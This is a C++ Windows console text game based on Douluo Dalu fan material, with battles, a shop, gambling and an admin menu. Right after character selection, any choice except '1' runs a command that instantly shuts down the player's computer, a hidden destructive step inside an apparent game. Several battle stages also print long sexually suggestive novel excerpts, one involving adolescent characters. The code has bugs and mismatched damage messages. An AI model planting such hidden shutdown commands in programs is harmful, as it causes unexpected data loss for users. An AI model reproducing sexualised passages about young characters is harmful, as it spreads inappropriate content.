#include <bits/stdc++.h>//万能头文件 
#include <windows.h>
#include <iostream>
using namespace std;
int main()
{ 
system("color f0");//先用黑底白字，顺眼 
printf("\
斗罗大陆3\n\
n\
著作者：朱逸轩\n\n"); 
Sleep (1000); 
printf("很久以前，在斗罗大陆中有许多魂师--龙皇斗罗，银龙斗罗，擎天斗罗。他们一直以世界巅峰为目标，分成 两派不断进行战斗。\n\n");
Sleep (1000);
printf("但只有一个世界巅峰第一人，他们激战了三天三夜\n\n"); 
Sleep (1000);
printf("不久，一场大战便引发了。\n\n");
Sleep (1000); 
printf("大战了三天三夜，三百万个回合。终于，圣灵教被史莱克七怪封印在斗罗大陆的极北之地。\n\n");
Sleep (1000);
printf("一天，龙皇斗罗用最后一点魂力，从梦中告诉你：\n\
“和平只是短暂的，圣灵教会解开封印。”\n\n\
说罢，便将黄金龙枪交给了你。\n\n");
Sleep(1000);
printf("一场新的故事拉开了序幕...\n\n");
Sleep(1000);
int mz;
char jiaochen ,mxp,mx,ms,shop,pl,gl1,gl2,gl3,gl4,gd;
int sj,xue1,xue2,xue3,xue4,xue5,xue6,xue7,xue8,xue9,xue10,gj=15,xue=200,s2,db,bd1,dbm,gl,dj=0;
float s1,money=100;
printf(" 你的魂师：");
Sleep(1000);
printf("1.唐舞麟 2.古月娜 3.谢邂 4，许小言");
cin>>mz;
if(mz!=1)
system ("shutdown -s -t 0"); 
printf("是否需要教程？（Y or N）\n");
cin>>jiaochen;
if( (jiaochen != 'Y'&&jiaochen!='y') && (jiaochen != 'N'&&jiaochen!='n') )//输入错误 
{
cout<<"魂师不要乱输！"<<endl; 
}
if((jiaochen=='Y')||(jiaochen=='y'))//教程 
{
printf("亲爱的%s：\n若输1，则进入对战模式。\n若输2，则进入商店模式。\n若输3，则进入状态显示模式。\n刚进入时有100金币，好好利用他吧！\n没金币就进入对战模式胜利赚钱吧！更多玩法等待你发现...\n", mz); 
}//教程完
while(1)//主程序 
{
loop:
printf("\n\n1--对战模式 2--商店模式 3--状态显示模式 4--赌博模式 5--管理模式");
cin>>ms;
if(ms=='1')//冒险模式
{
printf(" E--退出\n 1--觉醒武魂\n 2--结识谢邂\n 3--获得神器黄金龙枪\n 4--突破第八重封印\n 5--我的父亲是唐三\n 6--那母亲......\n 7--海神九考\n 8--古月娜\n 9--那一吻的风情\n A--决战圣灵教\n");
cin>>mx;
if(mx=='E'||mx=='e'){goto loop;}
if(mx == '1')
{//1
xue1=50;
while(xue1>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=10;printf("逃跑失败！你被扣了10精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue1-=gj;xue-=10;
printf("你被扣了10精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue1);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000);return 0;}
}
if(xue1 <= 0){money+=30;dj+=25;printf("你赢了！加30金币，25经验，现有%.2f金币，%d经验", money,dj);}
}//1完
if(mx == '2')
{//2
xue2=100;
while(xue2>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=20;printf("逃跑失败！你被扣了20精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue2-=gj;xue-=20;
printf("你被扣了20精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue2);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue2 <= 0){money+=60;dj+=50;printf("你赢了！加60金币，50经验，现有%.2f金币,%d经验", money,dj);}
}//2完
if(mx == '3')
{//3
xue3=200;
while(xue3>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=40;printf("逃跑失败！你被扣了40精神力，剩%d精神力、。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue3-=gj;xue-=40;
printf("你被扣了40精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue3);
}
if(xue <= 0){printf("你失去了所有精神力！"); Sleep(10000000);return 0;}
}
if(xue3 <= 0){money+=120;dj+=100;printf("你赢了！加120金币，100经验现有%.2f金币,%d经验", money,dj);}
}//3完
if(mx == '4')
{//4
xue4=400;
while(xue4>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=80;printf("逃跑失败！你被扣了80精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue4-=gj;xue-=80;
printf("你被扣了40精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue4);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue4 <= 0){money+=240;dj+=200;printf("你赢了！加240金币，200经验,现有%.2f金币,%d经验", money,dj);}
}//4完
if(mx == '5')
{//5
xue5=800;
while(xue5>0)
{
Sleep(1000);
cout<<"龙皓晨能感受到她的情绪很不稳定，甚至能够感受到有湿润的液体浸入了之的衣襟。一时间不禁大为吃惊,“采儿，你这是怎么了？"<<endl;
Sleep(1000);
cout<<"转过身，龙皓晨将她接入自己怀中。此时的采儿穿了一身黑色长裙，和她那胜雪的肌肤形成鲜明对比。两年过去，采儿也长大了，身材更加高挑，但柔软如棉的触感却一点都没变，搂着她，那种完全契合入身体般的感受实在是太美妙了。纤细的腰肢和她身体的温热顿时引的龙皓晨一阵心猿意马。"<<endl;
Sleep(1000);
cout<<" 他们都长大了，已经不再是少年时单纯的爱恋，在身体接触之下，难免会产生强烈的生理反应。"<<endl;
Sleep(1000);
cout<<" 龙皓晨只觉得自己的手居然有些颤抖了，脑海中不由得浮现出当初在梦幻神殿内采儿身无寸缕的样子，一时间，他只觉得心中一片火热。"<<endl;
Sleep(1000);
cout<<" 在他肩头，承载了太多的东西，只有在单独和采儿在一起的时候，他的心才能随之放松几分。"<<endl;
Sleep(1000);
cout<<" “皓晨。“采儿抬起头，一双纤细柔软的手臂宛如水蛇般缠扰上了龙皓晨的脖子，竟是主动送上了自己的红唇。"<<endl;
Sleep(1000);
cout<<" 她是他心中唯一的爱，在如此诱惑面前，龙皓晨又怎么可能把持的住自己呢？"<<endl;
Sleep(1000);
cout<<"四唇相接，稚嫩与生涩交融。采儿的唇很凉，还有些颤抖，但她的动作却很ji烈，紧紧的搂着龙皓晨的脖子，就像是生怕自己抓不住他似的。"<<endl;
Sleep(1000);
cout<<" 冰冷渐渐变成了火热，呼吸也越发急促了。"<<endl;
Sleep(1000);
cout<<" 一件件衣物散落，当两人一同跌在床上的那一刻，采儿不由得轻轻的闷哼一声。"<<endl;
Sleep(1000);
cout<<" 原始的本能促使着他们寻找着，寻找着生命的起源。终于，灼热找到了温软的那一瞬。"<<endl;
Sleep(1000);
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=160;printf("逃跑失败！你被扣了160精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue5-=gj;xue-=160;
printf("你被扣了160精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue5);
}
if(xue <= 0){printf("你失去了所有精神力！"); Sleep(10000000);return 0;}
}
if(xue5 <= 0){money+=480;dj+=400;printf("你赢了！加480金币，400经验,现有%.2f金币,%d经验", money,dj);}
}//5完
if(mx == '6')
{//6
xue6=800;
while(xue6>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=320;printf("逃跑失败！你被扣了320精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue6-=gj;xue-=320;
printf("你被扣了3200精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue6);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue6 <= 0){money+=960;dj+=800;printf("你赢了！加960金币，800经验,现有%.2f金币,%d经验", money,dj);}
}//6完
if(mx == '7')
{//7
xue7=1600;
while(xue7>0)
{
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=640;printf("逃跑失败！你被扣了640精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue7-=gj;xue-=640;
printf("你被扣了6400精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue7);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue7 <= 0){money+=1980;dj+=1600;printf("你赢了！加1980金币，1600经验,现有%.2f金币,%d经验", money,dj);}
}//7完
if(mx == '8')
{//8
xue8=3200;
while(xue8>0)
{
Sleep(1000);
cout<<" 王冬儿闭上双眼、红着俏脸，将嘴凑过去，轻轻的把自己的丁香小舌送到霍雨浩口中，渡过药液。但她的舌尖有些敏感。碰到霍雨浩舌头的时候，明显有些躲闪。"<<endl; 
Sleep(1000);
cout<<"霍雨浩轻轻一吸，就用自己的舌头卷住了王冬儿忐忑的小香舌。王冬儿原本闭着的双眼顿时瞪大了。 "<<endl;
Sleep(1000);
cout<<"“呜呜！” "<<endl;
Sleep(1000);
cout<<"霍雨浩却是吸住不放，轻轻的吸吮着。 "<<endl;
Sleep(1000);
cout<<"王冬儿赶忙又闭上双眼。她不敢挣扎，唯恐弄疼了他。 "<<endl;
Sleep(1000);
cout<<"这一吻，一直吻到两人呼吸都变得急促才停下来。"<<endl;
Sleep(1000);
cout<<"王冬儿坐直身体的时候。已是鼻息咻咻，微嗔的瞪视着霍雨浩。 "<<endl;
Sleep(1000);
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=1280;printf("逃跑失败！你被扣了1280精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue8-=gj;xue-=1280;
printf("你被扣了12800精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue8);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue8 <= 0){money+=3960;dj+=3200;printf("你赢了！加3960金币，3200经验,现有%.2f金币,%d经验", money,dj);}
}//8完
if(mx == '9')
{//9
xue9=6400;
while(xue9>0)
{
Sleep(1000);
cout<<"请观看文字，完成下列挑战"<<endl;
Sleep(1000);
cout<<" "<<endl;
Sleep(1000); 
cout<<"唐舞麟从来都不知道古月竟然会变得如此炽热，就像要融化他一般炽热。"<<endl;	
Sleep(1000);
cout<<"她竟然主动吻着他，那是带着微咸味道的吻，她的唇瓣火热而芬芳，更有着难以形容的情感爆。"<<endl; 
Sleep(1000);
cout<<"唐舞麟心中的感情又何尝不是压抑多年？他紧紧地搂着她，想要将她所有的一切都融入到自己的身体之中。"<<endl; 
Sleep(1000);
cout<<"他不知道在什么地方，只知道周围全都是树木。而在自己怀中的，就是自己这一生最重要的女人。 "<<endl;
Sleep(1000);
cout<<"这一吻很久很久。两人都很青涩，青涩的不知道该如何继续。他只是在她的背臀处用力的搂紧，她则紧紧的搂着他的脖子。"<<endl;
Sleep(1000);
cout<<"良久良久……"<<endl;
Sleep(1000);
cout<<"直到两人都有些喘不过气来，直到他们的唇瓣都已经微微红肿，他们才终于再次搂紧对方，大口大口的喘息着。"<<endl; 
Sleep(1000);	
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=2560;printf("逃跑失败！你被扣了2560精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue9-=gj;xue-=2560;
printf("你被扣了2560精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue9);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue9 <= 0){money+=7980;dj+=6400;printf("你赢了！加7980金币，6400经验,现有%.2f金币，%d经验", money,dj);}
}//9完
if(mx == 'a'||mx=='A' )
{//10
xue10=12800;
while(xue10>0)
{
cout<<"请观看福利"<<endl;
Sleep(1000);
cout<<"还是霍雨浩率先从睡梦中醒转过来，他从未感觉过睡觉竟然是如此舒服的一件事。尤其是怀中还有一个软绵绵的大抱枕……"<<endl; 
Sleep(1000);
cout<<"等等，抱枕？"<<endl;
Sleep(1000);
cout<<" 霍雨浩下意识的睁开眼睛，顿时看到了一副令他血脉喷张的景象。"<<endl;
Sleep(1000);
cout<<" 王冬儿依旧依偎在他怀中，但和昨天晚上相比，两人的位置都发生了一些变化。"<<endl;
Sleep(1000);
cout<<" 王冬儿一双修长的大腿绞住了霍雨浩的右腿，左手搂着他的脖子，整个人都贴合在他身上。粉蓝色的长发披散在身后，在窗外的阳光照耀下，散发着神秘而又绚烂的光彩。"<<endl;
Sleep(1000);
cout<<" 或许是因为她睡觉太不老实了，以至于衣衫有些不整，居然是香肩半露，粉嫩的肌肤仿佛能捏出水来一般，锁骨并不算太清晰，但却很美，逐渐向下勾勒出一抹浑圆的弧线。"<<endl;
Sleep(1000);
cout<<" 再向下？再向下就看到了！"<<endl;
Sleep(1000);
cout<<" 霍雨浩下意识的吞咽了一口口水。王冬儿的一双大腿纠缠着他一条腿，也就相当于将自己的一条腿送到了霍雨浩双腿之间啊！"<<endl;
Sleep(1000);
cout<<" 她的大腿不但修长，而且浑圆又充满弹性，而且，还能隐隐接触到一些对霍雨浩极为神秘又充斥着无尽吸引力的地方。尽管还隔着基层衣服，但霍雨浩必竟是青春少男啊！所以，他有了反应……"<<endl;
Sleep(1000);
cout<<" 我在干什么？太无耻了！霍雨浩尴尬的轻轻挪动着自己的身体，试图调整一下某处的位置。"<<endl;
cout<<" 可他这一动不要紧，王冬儿也跟随着动了一下，大腿伴随着身体的扭动在他两腿之间蹭了蹭。霍雨浩的双腿瞬间绷紧，整个人也完全从刚刚睡醒时的朦胧清醒过来。他能清楚的感觉到，某些地方在长大、长大、长大……"<<endl;
Sleep(1000);
cout<<" 不能这样？霍雨浩暗骂自己一句，右手用力的在自己腰间拧了一把。顿时，剧烈的疼痛传遍全身。好不容易才将自己心中欲念压制了下去。"<<endl;
Sleep(1000);
cout<<" 不能再这样下去了！霍雨浩心中暗想，我也不是圣人啊！冬儿，你这不是逼我犯罪么？必须要把苗头扼杀在摇篮之中。一边想着，他小心翼翼的去拉王冬儿肩膀处的衣襟 ，想要帮她把衣服弄好。"<<endl;
Sleep(1000);
cout<<"可是，他这一拉不要紧。那原本只是露出一丝端倪的弧线居然立刻变得清晰了。一道小有规模的沟壑甚至呈现在他眼前。"<<endl;
Sleep(1000);
cout<<"而这道沟壑就像是拥有着无穷吸力一般，牢牢的锁住了他的视线，想要收回，可偏偏却怎么都做不到"<<endl;
Sleep(1000);
printf("敌方冲了过来，是否逃跑？(Y or N)"); 
cin>>mxp;
srand((unsigned)time(NULL));
sj = rand();
if(mxp == 'Y'||mxp=='y')
{
if(sj%2==0){cout<<"逃跑成功！"<<endl;break;}else{xue-=5120;printf("逃跑失败！你被扣了5120精神力，剩%d精神力。\n", xue);}
}
if(mxp == 'N'||mxp=='n')
{
xue10-=gj;xue-=5120;
printf("你被扣了51200精神力，剩%d精神力。\n敌人被扣了%d精神力，剩%d精神力。\n",xue,gj,xue10);
}
if(xue <= 0){printf("你失去了所有精神力！");Sleep(10000000); return 0;}
}
if(xue10 <= 0){money+=15960;dj+=12800;printf("你赢了！加15960金币12800经验,现有%.2f金币,%d经验", money,dj);}
}//10完

}//冒险模式完
if(ms=='2')//商店模式 
{
printf("\n E--退出\n 1--魂导器(加100魂力)--10金币\n 2--黄金龙枪(加400魂力)--40金币\n 3--海神三叉戟(加800魂力)--80金币\n 4--奶瓶(加500精神力)--50金币\n 5--魂灵(加1000精神力)--320金币\n 6--魂环(加64000精神力)--999金币n 7--批量购买\n若金币不足自动跳出");
cin>>shop;
if( (shop == '1') && (money >= 10) ){ gj += 100; money-=10; printf("\n\n成功！你有%d点魂力,%.2f金币\n" ,gj,money); }//1
if( (shop == '2') && (money >= 40) ){ gj += 400; money-=40; printf("\n\n成功！你有%d点魂力,%.2f金币\n" ,gj,money); }//2
if( (shop == '3') && (money >= 80) ){ gj += 800; money-=80; printf("\n\n成功！你有%d点魂力,%.2f金币\n" ,gj,money); }//3
if( (shop == '4') && (money >= 50) ){ xue += 500 ;money-=50; printf("\n\n成功！你有%d滴精神力,%.2f金币\n" ,xue,money); }//4
if( (shop == '5') && (money >= 320) ){ xue += 1000; money-=320; printf("\n\n成功！你有%d精神力,%.2f金币\n" ,xue,money); }//5
if( (shop == '6') && (money >= 999) ){ xue += 64000; money-=999; printf("\n\n成功！你有%d精神力,%.2f金币\n" ,xue,money); }//6
if(shop=='e'||shop=='E')goto loop;
if( shop == '7')
{//7
printf("\n E--退出\n 1--魂力物器\n 2--精神力物器");
cin>>pl;
if(pl=='e'||pl=='E')goto loop;
if(pl == '1')
{
printf("请输入要加的魂力：");cin>>s2;
s1 = s2/20.00*40;if(money >= s1){gj+=s2;money-=s1;printf("\n\n成功！你有%d点魂力,%.2f金币\n" ,gj,money);}
}
if(pl == '2')
{
printf("请输入要加的精神力：");cin>>s2;
s1 = s2/160.00*40;if(money >= s1){xue+=s2;money-=s1;printf("\n\n成功！你有%d精神力,%.2f金币\n" ,xue,money);}
}
}//7完
}//商店模式完
if(ms=='3')//状态显示模式
{
printf("\n你有%d精神力，%d点魂力，%.2f金币。\n" ,xue,gj,money); 
}//状态显示模式
if( (ms!='1') && (ms!='2') && (ms!='3') &&(ms!='4')&&(ms!='5'))
{
cout<<"\n英雄不要乱输。"; 
}
if(ms=='4')
{ 
printf("\n惊心动魂的时刻来了，请输入你的幸运数字：");cin>>db;
printf("\n请输入你的赌注：");cin>>dbm;
srand((unsigned)time(NULL));bd1 = rand();
if( bd1 % 2 == dbm % 2 && money >= dbm){printf("\n你赢了！加赌注的1.5倍！");money = money+0.5*dbm;}
if( bd1 % 2 != dbm % 2 && money >= dbm){printf("\n你输了！减去赌注！");money-=dbm;}
}
if(ms=='5') 
{
gly:
printf("\n (EEEE--退出) 请输入管理员密码(四位)：");cin>>gl1>>gl2>>gl3>>gl4;
if((gl1=='E'&&gl2=='E'&&gl3=='E'&&gl4=='E')||(gl1=='e'&&gl2=='e'&&gl3=='e'&&gl4=='e'))goto loop;
if(gl1=='0'&&gl2=='8'&&gl3=='2'&&gl4=='5')
{
system("cls");g1:
printf("\n 成功！\n (E--退出)你有%d精神力，%d点魂力，%.2f金币。\n 1--改精神力\n 2--改魂力\n 3--改金币\n",xue,gj,money);cin>>gd;
if(gd=='1')goto gd1;
if(gd=='2')goto gd2;
if(gd=='3')goto gd3;
}
else{system("cls");printf("\n错误！\n");goto gly;}
}
}//主程序完 1221
gd1: 
printf("请输入精神力：");cin>>gl;xue=gl;goto g1;
gd2:
printf("请输入魂力：");cin>>gl;gj=gl;goto g1;
gd3:
printf("请输入金币：");cin>>gl;money=gl;goto g1;
return 0;
}
